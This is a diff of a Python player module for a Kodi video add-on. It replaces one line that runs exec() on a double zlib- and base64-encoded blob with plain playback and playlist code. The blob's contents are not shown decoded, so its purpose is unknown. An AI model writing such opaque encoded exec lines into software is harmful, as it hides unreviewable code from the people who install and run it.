@@ -1,3 +1,59 @@
+# -*- coding: utf-8 -*-
+# Python 3
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('eNoN0zeyo0AABNADEeAZCDYQ3oOEJxMwCO/96feHXdXR62poz3iI7u7Y/t7oRqC//XPn2ZMNb8FpyfCB7KAJs9ZYt3k8USZ8KeGC3/uloQAPT2L8mY4bO7TlGcLCzPuhdmTBjdpZZ3mapP0EycOfAUKkuy9RpbQYl0aCMsg5ejhJ5+m/h3B9WP5giIy2a32kWkRw2xYtDC98favAvHOu3s+xGX+o0gikCvtT/4a7CfDfaS12lrt2q9KidPlOrvU0HxlOn/b4ODlqkiiCLViIFHJrSW64HCGFce1icLp1QWmQfDMaTVYmIb3fUol7R4ngthUtPtnglSzzVMfVU93xqJRobLlSWvjKdaJERyZD+Vn5Qn1s/FdylOVAsT6Jb1859vz9i+ebW1gbFioRuvX0odrQUbPyhjiOcq67IiWhlhPuQGT/9unOFAuNkxm+qI9jpgkerjYWeTBhFEU//ZU/Kv1mKp5QvYTPX9Vsnc4kyZVdSa+wylW+0pLOP8Uh7TQB9z4HpRYqarAE8YY+RyYFudi/8hAsVpbX3ptZZfEaF6gjpyCy4BvWl3koQo0LEGYZxfk6ke8fg7UpDcBWZ5TQ9XE41TQopQhgxVBNw090KHduyYabqjr8sxUj/usvcvUKljIuHNCpb5PHyFIM75+XhA2O1cWCQet8zTIbsT+C8yscHCET5yZa0tQOMl55Dy3j2kzC1BUjCDA84ZG9Omc1j6leY4mwzHJRIgAUAXe6eCarwfkMZS9MNxV8nriMYKcl/cI/m9ubo4c/NebyJaze9DAGDlwUh+vO83f/8b8aYDxvT7vqtmu+qVKoBsYODIhj3fTFPMyAG9kOR7F1/QHS8y5cnP5CmyfdycKTeF0FyHJWV5nTKhpfl134mSguimouaTn7Wht/S+SptI/46YXI3ckftPSQDo33AW6brSUZE0/UqvLXgflkvr2sCsBRxjvF2e+0q3tkCi4vDlxNPM7M/X4g2NQLkq7Jqzl8sJOo5gkoTegsvPBRjqDa+razE9HX+reZgMqCXoakP6ogT6Y4McOQn1sEwZKJezZGX/uT9Uu94hnFY25RoaVF+kXRYwXxiit+HeJRapyplAuXjjgsV9JnMtaAB6GT2ZPKDxZJz1DJWEziXjZ3h5I86/Z5up2XDq4RWcEQf+jVDICbReDYmfkO/DpQouOFxk/cGG6tjC2oCNdfWbrnBJHHWL/hmr1h7Q1POv0QF5JRpHslWqTyMpksnZzu7E3EskJ4BUopJ5nRjl+m3kcI9deYZ1RNJ/5lNKwyUW/WZukuE1C3TElHd/jQ0e87Cv1Lf6HwQN6S61xaJS9ZPPZHcjxYu27d0bbmxQrC4k2gQVYmBb+BiDJ46KhkxQyOUhalbNflixuwRxlZC3t+KAx23sCYBkU+n3H4DMKac9FxNVJUl170vPx5JUcQTkJcJkKpb1wErofsMXHaNPFUx3eeZzPjAp9ZM103i9m5yfZn0Lq1NvZVZmWnFDvoCIotwubQMR+ym72m5Ct7zia9NINlffvin46zi3emiuU+RacDz62p84k1Q5VdEHYL6zMPQwqjKV5u8CS6KDrSyq1u22lHLYj/uh7+3k8VN+B2VyBdnwNsa6RK82uXqIqTE3f//Vr55t0VYtRYvG/7b3+s1wItbdmpfSos16tZH8KeMEC9YehKwSXHiYbN7JcRleFuJFuGmtVVR/tfsOJZww+eJmF6s9c8jHlKcMWIvyrq++gMajUZMgNSfPyak41+MRRbirzzj3Lz7jtY5AkP8PjK8a9EK11t4ZS/uLm2q1aLyMWUvsLFn3FV4Gzf4034POS8WGc8X6oJ6mEME3vPWL/CxnoetnYOlt3SD9N5zzRyMaU4IhjI1kKiL/1YFT1HhdL44qzKIpGX5GZTuWCOHqR6RnGg1iTvz+Msunqer7oiX58oLqhFGeGgNacoTIMTr0zHofMdIqVIis6bQsUBQo1jrTTSQcwecv473JudwG+DX3VKwAUz5nkhtbk3SIfhU4YzMtfLyr0hvOJQME1NnpTohrxiUuOPH6JrpUF2Svgme8dKdylFvSYbj/ibZga/ML769yeSnVwubd4aEiOjBMiG9XZyVZ0gwEL4W3Y/zZ+dHJltRjtRlmUF0ofgwF6jWGtJtS1qyPIp7HE2dk227GsNzQHRqcRkIkC7B0B9D7C7xXZUadQYtfDoiqM/P6Z4akax+DVkDTgY/VG/KLasK0C/fxpPoKpq++8/gGzYUw==')))).decode('utf-8'))
+import xbmc
+from resources.lib.gui.gui import cGui
+from resources.lib.config import cConfig
+from xbmc import LOGINFO as LOGNOTICE, LOGERROR, log
+
+LOGMESSAGE = cConfig().getLocalizedString(30166)
+class XstreamPlayer(xbmc.Player):
+    def __init__(self, *args, **kwargs):
+        xbmc.Player.__init__(self, *args, **kwargs)
+        self.streamFinished = False
+        self.streamSuccess = True
+        self.playedTime = 0
+        self.totalTime = 999999
+        log(LOGMESSAGE + ' -> [player]: player instance created', LOGNOTICE)
+
+    def onPlayBackStarted(self):
+        log(LOGMESSAGE + ' -> [player]: starting Playback', LOGNOTICE)
+        self.totalTime = self.getTotalTime()
+
+    def onPlayBackStopped(self):
+        log(LOGMESSAGE + ' -> [player]: Playback stopped', LOGNOTICE)
+        if self.playedTime == 0 and self.totalTime == 999999:
+            self.streamSuccess = False
+            log(LOGMESSAGE + ' -> [player]: Kodi failed to open stream', LOGERROR)
+        self.streamFinished = True
+
+    def onPlayBackEnded(self):
+        log(LOGMESSAGE + ' -> [player]: Playback completed', LOGNOTICE)
+        self.onPlayBackStopped()
+
+
+class cPlayer:
+    def clearPlayList(self):
+        oPlaylist = self.__getPlayList()
+        oPlaylist.clear()
+
+    def __getPlayList(self):
+        return xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
+
+    def addItemToPlaylist(self, oGuiElement):
+        oListItem = cGui().createListItem(oGuiElement)
+        self.__addItemToPlaylist(oGuiElement, oListItem)
+
+    def __addItemToPlaylist(self, oGuiElement, oListItem):
+        oPlaylist = self.__getPlayList()
+        oPlaylist.add(oGuiElement.getMediaUrl(), oListItem)
+
+    def startPlayer(self):
+        log(LOGMESSAGE + ' -> [player]: start player', LOGNOTICE)
+        xbmcPlayer = XstreamPlayer()
+        monitor = xbmc.Monitor()
+        while (not monitor.abortRequested()) & (not xbmcPlayer.streamFinished):
+            if xbmcPlayer.isPlayingVideo():
+                xbmcPlayer.playedTime = xbmcPlayer.getTime()
+            monitor.waitForAbort(10)
+        return xbmcPlayer.streamSuccess
